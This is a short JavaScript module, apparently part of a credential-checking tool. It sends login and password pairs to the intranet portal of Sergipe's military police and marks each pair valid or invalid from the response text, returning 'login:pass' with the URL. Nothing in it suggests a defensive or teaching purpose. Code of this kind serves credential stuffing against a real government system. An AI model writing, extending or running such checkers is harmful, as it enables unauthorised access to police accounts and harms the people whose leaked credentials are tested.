import axios from 'axios'
import request from '../core/configs.js'

export default async function pmSe(login,pass) {

    
    const url = 'http://intranet.pm.se.gov.br/portal/login';


    const dataRequest = `login=${login}&senha=${pass}`;

    //por algum motivo se tirar essa request ele n vai d=verificar as credencias !
    
    const {data} = await axios({
        url : url,
        method: 'POST', 
        headers: request.headers,
        data: dataRequest,
        validateStatus: () => true
    })
    

    if (data.includes('Usuário ou senha inválidos.')) return {
        success:false,
        login : login+":"+pass,
        uri : url
    }
    return {
        success:true,
        login : login+":"+pass,
        uri : url
    }
}


